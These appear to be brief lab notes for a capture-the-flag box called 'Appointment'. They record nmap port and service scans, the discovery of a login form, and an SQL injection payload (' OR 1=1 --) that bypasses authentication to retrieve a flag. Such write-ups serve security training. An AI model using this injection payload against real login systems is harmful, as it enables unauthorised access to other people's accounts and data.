# Appointment — Lab Notes

## Target
IP: <TARGET_IP>

---

# Recon

nmap -p- -sS -T4 --min-rate 1000 <TARGET_IP>

Result:
80/tcp open http

---

# Service Scan

nmap -sV -p 80 <TARGET_IP>

Service:
Apache HTTP Server

---

# Web Enumeration

Visited http://<TARGET_IP>

Login form discovered.

---

# Testing Input

Username: '
Password: '

Login failed.

Tested SQL injection payload:

Username: ' OR 1=1 --
Password: anything

Login successful.

---

# Result

Authentication bypass achieved.
Flag retrieved from application page.
